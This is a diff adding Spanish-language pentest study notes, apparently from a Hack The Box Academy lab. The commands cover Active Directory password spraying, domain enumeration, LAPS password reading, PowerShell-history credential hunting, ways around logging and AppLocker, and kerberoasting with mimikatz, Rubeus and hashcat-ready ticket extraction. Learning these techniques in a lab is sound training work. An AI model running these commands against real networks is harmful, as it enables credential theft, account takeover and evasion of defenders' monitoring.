@@ -1,0 +1,245 @@
+----------      ----------      ----------      ----------
+        ### Password spraying: Enumerar usuarios y politicas
+Consta del intento de loguearse a un servicio mediante el uso de una contraseña pero una larga lista de usuarios
+
+Para realizar este ataque correctamente priomero se necesita:
+-> Listado valido de usuarios de dominio
+-> Poliotica de contraseñas de la empresa
+
+----------
+## Obtener politica de contraseñas Windows
+net accounts
+#En CMD. Devuelve info de la poltica como longitud, cata cuanto expira, intento maximos antes de ser bloqueado, etc.
+
+import-module .\PowerView.ps1
+Get-DomainPolicy
+#Lo mismo que mas arriba pero con powershell
+
+----------
+        ### Password Spraying from Windows
+En el caso de que estemos en una maquuina windows, el uso del tool DomainPasswordSpray puede ayudarnos. https://github.com/dafthack/DomainPasswordSpray
+Si estamos autenticados, el tool genera una lista de usuarios, consulta la politica de pwd y ejecuta el Sprying sin bloquear las cuentas.
+Si no estamos autenticados, podemos pasarle una lista de usuarios como en Linux con "-UserList" flag
+
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+#Ejemplo del uso de tool estando autenticado en el dominio
+#En el caso de no estarlo, se le pasa con la flag de la explicaion (-UserList) la lista de usuarios validos
+
+----------  ----------  ----------  ----------
+        ### Enumerating Security Controls
+Get-MpComputerStatus
+#En windows, consultando con el comando anterior podemos saber si el "Real time protection" esta habiliatado o no. Esto es el windows defender
+
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+#Applocker es una aplicacion de Widnows que permite establecer una lista blanca con los sw que se pueden ejecutar en el sistema. Controla .exe, scripts, dlls, instaladores, etc
+#Algunas empresas bloquean PowerShell.exe pero no bloquean otras localizaciones de powershell como: "%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" o "PowerShell_ISE.exe"
+
+Find-LAPSDelegatedGroups
+#LAPS permite hacer random y rotar las contraseñas de admin evitando el movimiento lateral.
+#Enumerar los usuarios que pueden leer esto sirve para saber a que usuario apuntar
+Find-AdmPwdExtendedRights
+#El comando anterior permite revisar los permisos de cada computadora con LAPS habilitado para cada grupo con acceso de lectura.
+Get-LAPSComputers
+#Este comando permite saber las computadoras que tiene LAPS activado. Si nuestro usuario tiene permiso de lectura, muestra la pwd en cleartxt
+
+----------  ----------  ----------  ----------
+        ### Enumeracion de credenciales from Windows
+
+##ActiveDirectory PowerShell
+Import-Module ActiveDirectory
+Get-Module
+#Importar el modulo y verificar que se haya importado correctamente
+
+Get-ADDomain
+#Imprime informacion del dominio
+
+Get-ADUser
+#Devuelve listado de cuentas
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+#Devuelve listado de cuentas pero filtrando para que muestre posibles cuentas vulnerables a kerberoasting -> SPN
+
+Get-ADTrust -Filter *
+#Muestra relaciones de confianza que tenga el dominio.
+
+Get-ADGroup -Filter * | select name
+#Devuelve los grupos
+Get-ADGroup -Identity "<nombre de grupo>"
+#Devuelve info de un grupo en particular
+Get-ADGroupMember -Identity "<nombre de grupo>"
+#Devuelve informacion de miembros del grupo especificado
+
+----------
+##PowerView
+Get-DomainUser -Identity <usr> -Domain <domain> | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountco>
+#Enumerar informacion de un usuario especifico
+
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+#Enumerar informacion recursivamente sobbre el grupo Domain Admins
+
+Get-DomainTrustMapping
+#Enunmerar relacion de confianza del dominio
+
+Test-AdminAccess -ComputerName <nombre de maquina>
+#Muestra si en la maquina local o remota el usuario que posee acceso domo admin
+
+----------
+##SharpView
+.\SharpView.exe Get-DomainUser -Identity <usr>
+#Enumerar informacion del usuario
+
+----------
+##Snaffler
+.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
+#Tool que permite obtener credenciales o info sensible del dominio como archhivos de configuracion, etc
+#-s para que se muestre el output, -d para especioficar el dominio, -o especifica log file y
+
+----------
+##SharpHound
+.\SharpHound.exe -c All --zipfilename ILFREIGHT
+#Permite sacar la data y usarla en BloodHound GUI tool
+
+
+----------  ----------  ----------  ----------
+        ### Living of the land: Windows
+Mas info: https://academy.hackthebox.com/module/143/section/1360
+
+##Comandos nativos basicos
+hostname
+#Muestra informacion de la PC
+[System.Environment]::OSVersion.Version
+#Muestra infrromacion del sistema operativo
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+#Muestra patches and hotfixes aplicados en el host
+ipconfig /all
+#Muestra adaptadores de red y configuraciones
+set %USERDOMAIN%
+#Muestra el dominio al que pertenece (desde CMD)
+set %logonserver%
+#Muestra nombre del DC (desde CMD)
+systeminfo
+#Muestra un resumen de la inforrmacion del host.
+
+----------
+##Comandos nativos PowerShell
+Get-Module
+#Muestra los modulos que estan cargados
+Get-ExecutionPolicy -List
+#Muestra la configuracion de politicas en el host
+Set-ExecutionPolicy Bypass -Scope Process
+#Cambia la politica para un proceso en particular. Revierte la politica.
+Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+#Historial de powershell del usuario especificado
+Get-ChildItem Env: | ft Key,Value
+#Devuelve variables de entorno como key paths, usuarios, etc
+powershell.exe -version 2
+#Lanza la version 2 de powershell (si no se desinstalo) la cual no genera logs
+
+----------
+##Chequeando defensas
+netsh advfirewall show allprofiles
+#Firewall check
+sc query windefend
+#Windows defender (desde CMD) check
+Get-MpComputerStatus
+#Configuraciondes de anti virus habilitadas
+qwinsta
+#Chequeo si soy el unico logueado en la maquina
+
+----------
+----------
+##Informacion de red
+arp -a
+#Todos los hosts conocidos en la tabla arp
+ipconfig /all
+#Muestra kis adaptadores de red y las configuraciones
+route print
+#Muestra la tabla de routeo
+netsh advfirewall show state
+#Muestra el estado del firewall de host
+
+----------
+##Comandos NET
+net accounts
+#Politica de contraseñas
+net accounts /domain
+#Politica de contraseñas y lockout
+net group /domain
+#Informacion sobre el grupo de dominio
+net group "Domain Admins" /domain
+#Lista usuarios con privilegios de domain admin
+net group "domain computers" /domain
+#Lista PCs conectadas al dominio
+
+*Mas info y comandos: https://academy.hackthebox.com/module/143/section/1360
+En caso que se este monitoriando el comando "net" puede usarse "net1"
+
+----------
+##LDAP Filtering
+Funciona con dsquery
+
+dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=<MATHC>)" -limit 5 -attr sAMAccountName
+#Sintaxis basica
+#El match matchea entrre los bits del filtro que queremos realizar (https://academy.hackthebox.com/module/143/section/1360)
+#-attr establece los atributos LDAP que queremos ver. Ej: description, distinguishedName, userAccountControl, etc
+
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+#Ejemplo usando operador & 
+
+----------  ----------  ----------  ----------
+        ### Kerberoasting desde Windows
+##Semi manual con: setspn.exe
+Add-Type -AssemblyName System.IdentityModel
+#Add-Type agrega un clase .NET a powershell para ser inicializada despues
+#-AssamblyName flag permite especificar el assembly que contiene types que queremos usar
+#System.IdentityModel es un namespace que permite especificar clases para constrruir tokens de seguridad
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+#New-Object genera una nueva instancia .NET
+#System.IdentityModel.Tokens es un namespace que junto con .KerberosRequestorSecurityToken crea un toekn de seguridad SPN para requestear el kerberos TGS para la cuenta en la sesiona actual.
+
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+#Este comando convina los comandos de mas arriba con setspn.exe para requestear el ticket de todas las cuentas con SPN seteado
+
+[*] Una vez realizado esto, se pueden dumpear los tickets de la memoria mediante mimikatz
+base64 /out:true
+#Especificar esto genera que el output no se guarde en un .kirbi, sino que se muestre en pantalla en abse64. Puede ser positivo o negativo dependiendo la situacion y que sea mas simple para pasarlo a nuestra maquina
+kerberos::list /export
+#Comienza a exportar los TGS
+
+[*] Una vez en nuestra maquina el .kirbi tenemos que extaer el ticket
+python2.7 kirbi2john.py sqldev.kirbi
+#Esto crea un file con el ticket el cual debemos intentar crackear
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+#Limpiamos la dile generada (crack_file) para que hashcat pueda entenderlo
+
+[*] En el caso de tener el ticket en base64
+echo "<base64 blob>" |  tr -d \\n
+cat encoded_file | base64 -d > sqldev.kirbi
+#En este punto ya tenemos el .kirbi para hacer lo de arriba
+
+----------
+##Automatizado con: PowerView
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+#Muestra los usuarios para targetearlos
+Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat
+#Esto devuelve el ticket
+
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+#Exporta todos los tickets a un CSV file (ilfreight_tgs.csv)
+
+----------
+##Automatizado con: Rubeus
+.\Rubeus.exe kerberoast /stats
+#Muestra inforrmacion de usuarios kerberosteables
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+#Intenta requestear los tickets TGS de cuentaas con el atributo admincount en 1.
+.\Rubeus.exe kerberoast /user:<user> /nowrap
+#Intenta realizar la request para un usuario en particular
+/tgtdeleg
+#Esta flag le especifica al tool que solo haga request para hashes RC4 (tipo 23) que son mas rapidos de crackear.
+
+[*] El tipo de hash que soporta el envirionment puede consultarse:
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+
